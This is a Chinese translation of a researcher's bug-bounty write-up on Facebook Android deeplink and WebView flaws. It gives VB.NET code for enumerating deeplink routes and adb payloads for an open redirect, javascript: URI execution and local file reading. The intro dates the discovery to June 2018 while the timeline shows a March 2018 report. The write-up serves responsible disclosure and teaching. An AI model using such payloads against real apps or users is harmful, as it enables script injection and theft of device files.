**![
看我如何发现Facebook安卓APP的$8500美金Webview漏洞](https://image.3001.net/images/20180914/1536911621_5b9b6905a1dd7.jpg!small)****2018年6月，我在参与Facebook漏洞众测项目期间，发现了Facebook安卓APP应用中的两个Webview组件漏洞。利用这两个漏洞，攻击者可以构造恶意链接，通过Facebook安卓APP发送给受害者，目标受害者点击这个链接之后就会中招，致使攻击者可以在受害者手机中执行任意
Javascript 代码。**

在测试结果确切之前，我曾在3个不同手机终端中试验过这两个漏洞，漏洞原因主要在于Webview组件中。在与Facebook安全团队的来回协商之后，他们承认了这两个漏洞的有效性并及时进行了修复，我最终也获得了Facebook官方$8500美金的奖励。

## 前期发现

漏洞众测中的前期踩点非常关键，这有助于你了解目标的基本情况并能帮助你关注重点。在对Facebook安卓APP的前期踩点中，我把关注点聚集到了一个东西上面，那就是其APP中的deeplink，它也可以叫移动端深度链接或是应用跳转。

deeplink可以算是超链接的另外一种类型吧，在APP中它可以把你关联到一个特定的操作行为。就比如，fb://profile/1395634905，在安卓APP中点击这个链接，它会启动Facebook的APP应用，并跳转到你的个人资料页。

因此，我决定先在APK文件中来查看一些可见的纯文本文件，于是，我用WinRAR来打开了Facebook的最新版本的安卓APP，然后在其中查找字符串
“fb://” ，一会，它就返回了一个结果文件 'assets/Bundle-fb4.js.hbc'，检查之后可以发现，该文件中具备多个deeplink，其中包括：

> fb://marketplace_product_details_from_for_sale_item_id
>
> fb://adsmanager

但是，分析一番，最后也没什么可用之处。

然而，在一个为 fb://ama/ 的deeplink线索之下，我在WinRAR打开的APK文件中，找到了一个文件-'react_native_routes.json'，它可以算是一个“金矿”了，其中包含了Facebook APP操作处理的多个deeplink。

![
看我如何发现Facebook安卓APP的$8500美金Webview漏洞](https://image.3001.net/images/20180914/1536910742_5b9b6596dc3b4.png!small)从上图的文件图示中，我们可以分析构造出一个如下有效的Facebook
deeplink：

>
> fb://ama/?entryPoint={STRING}&fb_hidesTabBar={STRING}&presentationMethod={STRING}&targetURI={STRING}

'react_native_routes.json'
这个文件有12000多行代码，所以，我需要一些编程技巧来提取出其中的有效deeplink链接。之后，我开发了两个简单的应用程序，一个用于将JSON格式转换成数据库结构，另一个用于从数据库中创建链接。为了后续需要对数据进行处理，我尽量用数据库的思路来执行。以下就是将JSON格式转换成数据库结构的程序代码：

    
    
    #Moving JSON into a database structure
    Imports System.Data.SQLite
    Imports System.IO
    Imports Newtonsoft.Json.Linq
    Module Module1
        Sub Main(args() As String)
            ProcessFile("react_native_routes.json")
        End Sub
        Public Sub ProcessFile(InputFile As String)
            Dim JSONText = File.ReadAllText(InputFile)
            If JSONText.StartsWith("[") Then
                'Make valid JSON
                JSONText = "{'results' : " & JSONText & " }"
            End If
            Dim json As JObject = JObject.Parse(JSONText)
            Dim arr As JArray = json.SelectToken("results")
            For i = 0 To arr.Count - 1
                Try
                    Dim RouteName As String = arr(i).SelectToken("name")
                    Dim RoutePath As String = arr(i).SelectToken("path")
                    Dim paramJSON As JObject = arr(i).SelectToken("paramDefinitions")
                    Dim RouteParamateCount As Integer = arr(i).SelectToken("paramDefinitions").Count
                    If RouteParamateCount <> 0 Then
                        Dim o As Integer = 0
                        Dim RouteID As Integer = insertRoute(RouteName, RoutePath, RouteParamateCount)
                        For Each item As JProperty In arr(i).SelectToken("paramDefinitions")
                            o += 1
                            Dim ParamName = item.Name
                            Dim ParamType = item.Value("type").ToString
                            Dim ParamRequired = item.Value("required").ToString
                            insertParamater(ParamName, ParamType, ParamRequired, o, RouteID)
                        Next
                    End If
                Catch ex As Exception
                End Try
            Next
        End Sub
        Public Function insertRoute(RouteName As String, RoutePath As String,
                                    RouteParamaterCount As Integer) As Integer
            Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
            con.Open()
            Dim sql As String = "INSERT INTO RouteTable
                                (RouteName, RoutePath, RouteParamaterCount, RouteAddedDateTime)
                                  VALUES
                                (@RN, @RP, @RPC, @RAD)"
            Dim cmd As New SQLiteCommand(sql, con)
            cmd.Parameters.Add("RN", SqlDbType.VarChar).Value = RouteName
            cmd.Parameters.Add("RP", SqlDbType.VarChar).Value = RoutePath
            cmd.Parameters.Add("RPC", SqlDbType.Int).Value = RouteParamaterCount
            cmd.Parameters.Add("RAD", SqlDbType.Int).Value = Date.Now.Ticks
            cmd.ExecuteNonQuery()
            sql = "SELECT last_insert_rowid()"
            cmd = New SQLiteCommand(sql, con)
            insertRoute = cmd.ExecuteScalar()
            con.Close()
        End Function
        Public Sub insertParamater(ParamaterName As String, ParamaterType As String, ParamaterRequired As Boolean,
                                  ParamaterOrderIndex As Integer, RouteID As Integer)
            Dim PR As Integer = 0
            If ParamaterRequired = True Then
                PR = 1
            Else
                PR = 0
            End If
            Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
            con.Open()
            Dim sql As String = "INSERT INTO ParamaterTable
                                (ParamaterName, ParamaterType, ParamaterRequired, ParamaterOrderIndex, RoutesID)
                                  VALUES
                                (@PN, @PT, @PR, @POI, @RID)"
            Dim cmd As New SQLiteCommand(sql, con)
            cmd.Parameters.Add("PN", SqlDbType.VarChar).Value = ParamaterName
            cmd.Parameters.Add("PT", SqlDbType.VarChar).Value = ParamaterType
            cmd.Parameters.Add("PR", SqlDbType.Int).Value = ParamaterRequired
            cmd.Parameters.Add("POI", SqlDbType.Int).Value = PR
            cmd.Parameters.Add("RID", SqlDbType.Int).Value = RouteID
            cmd.ExecuteNonQuery()
            con.Close()
        End Sub
    End Module

以上的VB.NET代码，可以把JSON格式文件中的每条“路径（path）”，解析为其包括名称和参数数量的路径表RouteTable中的对应条目。与实际参数类似，其中的参数可能是存储在参数表ParamterTable中，其中的属性包括参数类型、名称、索引和是否为必填字段，以及返回路径（Route）中的链接等。

下面这个程序代码，用于处理SQLlite数据库内容，并生成一个命令行列表，然后通过ADB工具在安卓APP中执行deeplink。

    
    
    #Building ADB commands ready for breaking
    Imports System.Data.SQLite
    Imports System.IO
    Module Module1
      Sub Main(args() As String)
          Dim FilePath As String = Date.Now.ToString("ddMMyyHHmm") & ".txt"
          Dim FBLink As String = ""
          Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
          con.Open()
          Dim sql As String = "SELECT RouteID, RouteName, RoutePath FROM RouteTable"
          Dim cmd As New SQLiteCommand(sql, con)
          Dim reader As SQLiteDataReader = cmd.ExecuteReader()
          If reader.HasRows Then
              Using sw As StreamWriter = New StreamWriter(FilePath)
                  While reader.Read
                      FBLink = BuildLink(reader("RouteID"), reader("RouteName"), reader("RoutePath"))
                      FBLink = "adb shell am start -a ""android.intent.action.VIEW"" -d """ & FBLink & """"
                      sw.WriteLine(FBLink)
                  End While
              End Using
          End If
          reader.Close()
          con.Close()
      End Sub
      Public Function BuildLink(RouteID As Integer, RouteName As String, RoutePath As String) As String
          BuildLink = $"fb:/{RoutePath}/"
          Dim i As Integer = 0
          Dim con As New SQLiteConnection("Data Source=FBNativeRoutes.db")
          con.Open()
          Dim sql As String = "SELECT ParamaterName, ParamaterType, ParamaterRequired FROM ParamaterTable
                              WHERE RoutesID = @RID"
          Dim cmd As New SQLiteCommand(sql, con)
          cmd.Parameters.Add("RID", SqlDbType.Int).Value = RouteID
          Dim reader As SQLiteDataReader = cmd.ExecuteReader()
          If reader.HasRows Then
              While reader.Read()
                  If i = 0 Then
                      BuildLink &= "?" & reader("ParamaterName") & "=" & getValidValue(reader("ParamaterType"))
                  Else
                      BuildLink &= "\&" & reader("ParamaterName") & "=" & getValidValue(reader("ParamaterType"))
                  End If
                  i += 1
              End While
          End If
          reader.Close()
          con.Close()
      End Function
      Public Function getValidValue(ParamaterType As String) As String
          Select Case ParamaterType
              Case "String"
                  Return "{STRING}"
              Case "Int"
                  Return "{INT}"
              Case "Boolean"
                  Return "{BOOLEAN}"
              Case Else
                  Return "{STRING}"
          End Select
      End Function
    End Module

就以上述发现的 ama deeplink为例，以下就是最终在终端应用中解析执行的样子：

> adb shell am start -a "android.intent.action.VIEW" -d
> "fb://ama/?entryPoint={STRING}\&fb_hidesTabBar={STRING}\&presentationMethod={STRING}\&targetURI={STRING}"

这样，我就可以通过命令行来执行类似 fb:// url 这样的deeplink了，对deeplink的检查效率也就大大提高了！

## 发现漏洞

### ![
看我如何发现Facebook安卓APP的$8500美金Webview漏洞](https://image.3001.net/images/20180914/1536910984_5b9b6688f0052.png!small)第一个
- 开放重定向漏洞

现在，我们预先构建了一个364条的命令行的列表，那么，开始行动吧，来看看能从这些命令行中得到了什么样的响应。整个过程中有几个deeplink比较有意思，但最终我把关注点放到了以下这三个上面：

> adb shell am start -a "android.intent.action.VIEW" -d
> "fb://payments_add_paypal/?url={STRING}"
>
> adb shell am start -a "android.intent.action.VIEW" -d
> "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl={STRING}"
>
> adb shell am start -a "android.intent.action.VIEW" -d
> "fb://ads_payments_prepay_webview/?account={STRING}\&contextID={STRING}\&paymentID={STRING}\&url={STRING}\&originRootTag={INTEGER}"

这三个deeplink都有一个共同点，那就是url参数，像上面其中的
url={STRING}。那好，既然你需要url，那我就给你一个呗，用<https://google.com>试试，构造的Payload如下：

> adb shell am start -a "android.intent.action.VIEW" -d
> "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=<https://google.com>"

结果返回如下：

![
看我如何发现Facebook安卓APP的$8500美金Webview漏洞](https://image.3001.net/images/20180914/1536910962_5b9b6672f2022.png!small)哇，成功了！这就是一个开放重定向漏洞！你要知道，Facebook
一直都很重视SSRF和开放重定向这类漏洞。最终我上报之后，获得了Facebook不多不少$500美金的奖励。

### 第二个 - 用户终端本地文件读取漏洞

有了第一个漏洞作铺垫之后，我就往深处想，计划发挥更深入的漏洞影响。我能不能用javscript URI
来试试呢？还有，能不能想办法读取本地文件呢？于是，我又构造了以下两个Payload：

> adb shell am start -a "android.intent.action.VIEW" -d
> "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=javascript:confirm('<https://facebook.com/Ashley.King.UK>')"
>
> adb shell am start -a "android.intent.action.VIEW" -d
> "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=file:///sdcard/CDAInfo.txt"  
>

出乎意料，两个Payload都能成功执行！一个能调用到我自己的Facebook主页链接，一个能读取到客户端手机中的本地文件！

![
看我如何发现Facebook安卓APP的$8500美金Webview漏洞](https://image.3001.net/images/20180914/1536911533_5b9b68add85e1.png!small)其实，之后，我还想综合利用这些漏洞，尝试去发现更深层次的bug，但无奈最后无所发现。没有源代码，我这种黑盒测试的方法也只能到此为止了。那就向Facebook再上报一下这个漏洞吧，最终凭此漏洞，我又获得Facebook官方$8000美金奖励。

## Facebook安全团队的回应

>
> 我们正在处理你的上报漏洞，你的上报漏洞在于，可以从任何网页中调用这些服务端，但其影响有限。影响较为严重的要数那个在UI界面的本地文件读取漏洞，但前提也需要对用户终端设备的访问权限，也才能获取读取的数据信息。
>
>
> 然而，我们在WebView的代码审查中发现了一些与你上报漏洞相关的问题，这些问题出在WebView实际的配置和运行中。攻击者可以综合利用这些问题bug，来调用Facebook应用的某些内部服务端，并获取到一些敏感的HTML5
> API接口信息。
>
>
> 因为根据你的上报漏洞，我们在内部调查中也发现了几个更深层的问题bug，所以，根据我们的赏金策略，我们按照最高的潜在安全风险来确定你的漏洞赏金，奖励你的这些发现。

## 漏洞上报进程

> 2018.3.30 向Facebook上报漏洞
>
> 2018.4.4 Facebook有效响应
>
> 2018.4.13 Facebook修复漏洞
>
> 2018.5.16 Facebook发放赏金

 ***参考来源：[ashking](https://ash-king.co.uk/facebook-bug-bounty-09-18.html)，clouds编译，转载请注明来自FreeBuf.COM**

